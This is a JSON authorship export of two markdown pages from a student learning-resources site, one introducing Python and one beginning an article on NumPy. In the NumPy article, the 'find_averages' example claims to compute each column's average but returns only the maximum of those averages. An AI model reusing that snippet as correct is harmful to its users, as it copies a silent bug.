          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Getting started with Python‎](#getting-started-with-python)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Python 2 vs Python 3‎](#python-2-vs-python-3)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Virtual Environment‎](#virtual-environment)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Common Data Structures‎](#common-data-structures)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Indexing and Slicing‎](#indexing-and-slicing)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Object Oriented Programming in Python‎](#object-oriented-programming-in-python)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Functional Programming‎](#functional-programming)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Python for Data Science‎](#python-for-data-science)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Tutorials‎](#tutorials)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Gotchas‎](#gotchas)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "Python is a simple yet powerful and versatile language. Conceived in the late 80s, it is now widely used across many fields of computer science and software engineering. While not as speedy as compiled languages like C or Java, Python\u0027s emphasis on readability, and resulting ease of maintenance, often outweighs the advantages conferred by compiled languages. This especially true in applications where execution speed is non-critical."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Getting Started With Python"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "If you\u0027re a programmer looking to get in on the Python action, check out [Google\u0027s Python class](https://developers.google.com/edu/python/), which will introduce you to Python\u0027s concepts and core data structures like lists, dictionaries, and strings!"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "For absolute beginners, check out [this video](https://www.youtube.com/watch?v\u003dN4mEzFDjqtA) by Derek Banas where he covers everything from installing Python and the basics to more advanced concepts like Inheritance and Polymorphism in under an hour! If you\u0027d prefer to read, check out [Python Guru](https://thepythonguru.com/) which has plenty of code samples to help you along."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "Both newbies and experienced programmers can also benefit from [The Python Tutorial](https://docs.python.org/3/tutorial/index.html), which aims to introduce readers to Python\u0027s unique features and style."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "## Python 2 vs Python 3"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "Despite obvious similarities in two Python versions, Python 3\u0027s intentional backward incompatibility makes choosing to learn Python 3 over Python 2 a tough problem for both new and experienced Python programmers. Some concerns include the lack of popular Python 2 packages in Python 3 as well as changes in some Python built-in libraries that might break existing systems. One example is that a simple `print \u0027Hello World\u0027` that runs perfectly in Python 2 will cause a syntax error in Python 3."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "Read more in this Digital Ocean\u0027s [post](https://www.digitalocean.com/community/tutorials/python-2-vs-python-3-practical-considerations-2) to understand this conundrum of choosing between Python 2 and Python 3 better. If you choose to learn both Python 2 and Python 3, take a look at some of these important [changes](https://www.geeksforgeeks.org/important-differences-between-python-2-x-and-python-3-x-with-examples/) to avoid [gotchas](#gotchas) due to version differences."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "Overall, it is recommended to learn Python 3 as a beginner today as it has been [10 years since Python 3 debuted](https://www.python.org/download/releases/3.0/). This stance is also [supported](http://python-notes.curiousefficiency.org/en/latest/python3/questions_and_answers.html#why-is-python-3-considered-a-better-language-to-teach-beginning-programmers) by core members of Python. Moreover, unlike the early days of Python 3\u0027s release, many popular packages from Python 2 now support Python 3 as well. Since Python 2 is a legacy language while Python 3 is in active development, it would be better to learn Python 3 today."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "## Virtual Environment"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "When starting new projects or hopping onto existing Python repositories, you are recommended to install dependencies using a [virtual environment](https://docs.python.org/3/tutorial/venv.html) to avoid dependency conflicts. This is a good practice especially when managing dependencies from different projects which may rely on different Python versions and packages."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "The [official Python documentation](https://docs.python.org/3/tutorial/venv.html) gives instructions on the standard way of creating a virtual environment - defining a directory location and activating it. However, you can consider using other libraries that can make this process smoother. Some of the most popular ones are:"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [virtualenvwrapper](https://virtualenvwrapper.readthedocs.io/en/latest/install.html) - Allows you to define all environments in a single place instead of having to manage the different environments in your local system."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "* [pyenv](https://github.com/pyenv/pyenv) and [pyenv-virtualenv](https://github.com/pyenv/pyenv-virtualenv). `pyenv` allows easy management of different Python versions and `pyenv-virtualenv` allows managing virtualenv associated to the Python versions managed by `pyenv`."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "## Common Data Structures"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "Strings, lists, and dictionaries belong to a type of class known as `Iterables`. An `Iterable` is defined by Python to be \"an object capable of returning its members one at a time\"."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Due to their versatility you\u0027ll often find that strings, lists, and dictionaries are all you\u0027ll ever need. However, there may come a time when you\u0027ll need to create your own `Iterable` data structure. If that\u0027s the case, you may want to delve into the inner workings of `Iterable` classes, check out [Iterables, Iterators and Generators](http://excess.org/article/2013/02/itergen1/) by Ian Ward. He begins by explaining the `Iterable` class, then goes into the `Iterator` and `Generator` classes, both of which are powerful tools in Python."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "## Indexing and Slicing"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Accessing an element in a list using its index is known as indexing, e.g. `my_list[0]` returns the first element of my_list (Iterables are zero-indexed—their first index is 0). Slicing, on the other hand, allows us to access a range of elements in a list. Extended slicing extends this functionality by introducing a step parameter, enabling operations like accessing every other element. Read more about this in a blog post on [indexing and slicing](https://samsontmr.github.io/Slicing-and-Dicing/) in Python! There, I also explain the basics of list comprehension, a type of syntactic sugar for transforming lists. Trey Hunner gives an in-depth explanation [here](https://treyhunner.com/2015/12/python-list-comprehensions-now-in-color/) using the for-loops we all know and love."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "## Object Oriented Programming in Python"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "While Python is really useful for cranking out small scripts, we often want to use it to build fully fledged applications too. When this happens, [programming procedurally](https://en.wikipedia.org/wiki/Procedural_programming) results in major readability and maintenance issues—especially when your code starts breaking and you\u0027re trying to figure out why!"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "This is where Object Oriented Programming comes in, offering a way to think about your program and organizing it into readable chunks. Jeff Knupp gives an introduction to [Python Classes and OOP](https://jeffknupp.com/blog/2014/06/18/improve-your-python-python-classes-and-object-oriented-programming/) here, introducing concepts like static vs instance attributes, inheritance, abstract classes, and the Liskov Substitution Principle."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "## Functional Programming"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to scripting and OOP, Python also supports [functional programming](https://medium.com/@cscalfani/so-you-want-to-be-a-functional-programmer-part-1-1f15e387e536#.70kgem2gc), a completely different paradigm from OOP and procedural programming. Where procedural programming and OOP makes heavy use of states, functional programming eschews them completely. In this paradigm, the result of a function is wholly dependent on its arguments."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "*\"Why would I want to relearn how to code?!\"*, you may ask. Big Data\u0027s increasing relevance has thrown the spotlight on distributed systems and concurrency techniques. No prizes for guessing which programming paradigm is most amenable to the implementation of these systems. [Here](https://www.python-course.eu/python3_lambda.php) is a great introduction to the tools at the heart of functional programming in Python 3: `map`, `filter`, `reduce`, and `lambda`."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "An alternative way of doing functional programming in Python using list comprehensions to replace the `map`, `filter`, and `reduce` functions. [Here](http://www.u.arizona.edu/~erdmann/mse350/topics/list_comprehensions.html) is a comparison of both methods, complete with examples!"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "## Python for Data Science"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Data Science seems to be all the rage recently, so you\u0027ll be glad to know that Python has become a major player in the field of Data Science, rivalled mainly by R. Some commonly used Python libraries in Data Science include [pandas](https://pandas.pydata.org/) for data management and manipulation, [numpy](https://www.numpy.org/) and [scipy](https://www.scipy.org/) for scientific computing, [scikit-learn](https://scikit-learn.org/) for general machine learning and [matplotlib](https://matplotlib.org/) for data visualization."
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "### Tutorials"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "To get started, take a look at:"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Introduction to pandas](https://samsontmr.github.io/Sentimental-Pandas/)"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Numpy Quickstart Guide](https://docs.scipy.org/doc/numpy-dev/user/quickstart.html)"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "*   [matplotlib Tutorials](https://matplotlib.org/users/tutorials.html#introductory)"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "*   [scikit-learn Basics](https://scikit-learn.org/stable/tutorial/basic/tutorial.html)"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "*   [scikit-learn Machine Learning tutorials](https://scikit-learn.org/stable/tutorial/index.html) are also available for those looking to pick up machine learning."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    *   If you learn best by working on projects, fret not! [Kaggle](https://kaggle.com) is a treasure trove of real-world datasets that you can hone your data science skills on."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "## Gotchas"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Like most other languages, Python has its own set of common gotchas that can really frustrate newbie Python programmers due to the unintended bugs. Let\u0027s consider this common pitfall that many Python programmers encounter."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "```Python"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "def append_to(element, to\u003d[]):"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "    to.append(element)"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "    return to"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "my_list \u003d append_to(12)"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "print(my_list) # [12]"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "my_other_list \u003d append_to(42)"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "print(my_other_list) # [12,42]"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "Looking at the above example, one might think that `my_other_list` will be `[42]` but actually is `[12,42]`. The reason is because Python\u0027s default arguments, in this case `to \u003d []`, are evaluated only once when the function is defined."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "Learning how to avoid such pitfalls is one huge step towards being a productive Python programmer. Here are some other guides that state some common gotchas and how to avoid them:"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "* [Top 10 Common Mistakes of Python Programmers](https://www.toptal.com/python/top-10-mistakes-that-python-programmers-make)"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "* [Common Python Gotchas](https://sopython.com/wiki/Common_Gotchas_In_Python)"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "jamessspanggg": 10,
      "iskandarzulkarnaien": 14,
      "-": 94
    }
  },
  {
    "path": "contents/python/numpy.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: NumPy"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# NumPy"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Jeremy Tan](https://github.com/Parcly-Taxel)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [NumPy\u0027s Purpose](#numpy-s-purpose)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [NumPy\u0027s Benefits and Drawbacks](#numpy-s-benefits-and-drawbacks)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "* [Internals of NumPy](#internals-of-numpy)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "  * [The Array Type](#the-array-type)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Library Functions](#library-functions)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "* [Tutorials and Resources](#tutorials-and-resources)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "Before reading this article, you should have basic knowledge of Python and its iterable types."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "If not, do read [the introduction to Python](introduction-to-python.html) included among these learning resources. "
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "## NumPy\u0027s Purpose"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "Data scientists often work with highly structured data, like time series or plots of pixel values. On these data sets,"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "they routinely need to perform operations uniformly and efficiently. Without external packages, Python can express"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "and handle some of these operations reliably. For huge sets, however – like the training and test data provided to"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "machine learning algorithms – Python becomes complicated and sluggish."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "[NumPy](https://numpy.org) fills in the gaps, simplifying (and speeding up) the code required to process and"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "visualise data sets large and small. So many other science-oriented Python libraries depend on NumPy (pandas,"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "matplotlib, etc.) that NumPy describes itself as \"the fundamental package for scientific computing in Python\"."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "## NumPy\u0027s Benefits and Drawbacks"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "NumPy\u0027s main benefit is its abstraction of arrays. In a traditional imperative style, handling multi-dimensional"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "arrays requires multiple for loops or list comprehensions; both approaches lead to tedious, error-prone code, and"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "do not take advantage of vector instructions in modern processors."
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "For example, to find the average of each column in a two-dimensional array (list of lists):"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "def find_averages(arr):"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "    l \u003d len(arr[0])"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "    m \u003d len(arr)"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "    return max(sum(arr[j][i] for j in range(m)) / m for i in range(l))"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "This is quite a lot of work for a simple task. The equivalent code in NumPy is a single call:"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "import numpy as np"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "np.mean(arr, 0)"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "If you frequently deal with data sets more complicated than one-dimensional lists, NumPy is suited for you."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Transcribing array-based mathematics into NumPy is also made simpler by the many array functions and operators"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "in its library. Not only is the code clearer – a Python virtue – but it can reduce development and debugging time."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "# A and B are 2-by-2 matrices, c is a scalar"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "A \u003d np.array([[1, 5], [-1, 3]])"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "B \u003d np.array([[0, 2], [2, -3]])"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "c \u003d 2"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "c * A # scalar multiplication"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "A @ B # matrix multiplication"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "A \u003e B # compare A and B elementwise"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "B.T # matrix transpose"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "The downside to these benefits is a large memory footprint: NumPy\u0027s performance depends on compiled C and Fortran code,"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "so it may not be suitable for embedded systems. All elements of a NumPy array must also be of _the same_ type,"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "a primitive C type or something similar to one, for the rest of NumPy to work well; in particular Python integers"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "are treated as generic Python objects if they are too large, negating speed improvements, while strings have to be"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "interpreted as character arrays."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e np.array([1.5, \"a\"])"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "array([\u00271.5\u0027, \u0027a\u0027], dtype\u003d\u0027\u003cU32\u0027) # not a numeric type!"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e np.array([10 ** 20, 1])"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "array([100000000000000000000, 1], dtype\u003dobject)"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "Another limitation occurs when resizing arrays. In most cases, enlarging an array creates a new copy, like in C,"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "rather than simply making space for the new cells like in Python. Memory has to be managed manually for code that"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "works with data at scale."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e A \u003d np.array([[5, 0], [-1, -3]])"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e B \u003d np.append(A, [[-3], [1]], axis\u003d1) # creates a new object"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e B[0,0] +\u003d 1"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e A"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "array([[ 5,  0],"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "       [-1, -3]]) # not modified"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "## Internals of NumPy"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "Although NumPy overall is an intricate language, you should be able to easily grasp its two main features:"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "C-like arrays and the functions that work on them."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "### The Array Type"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
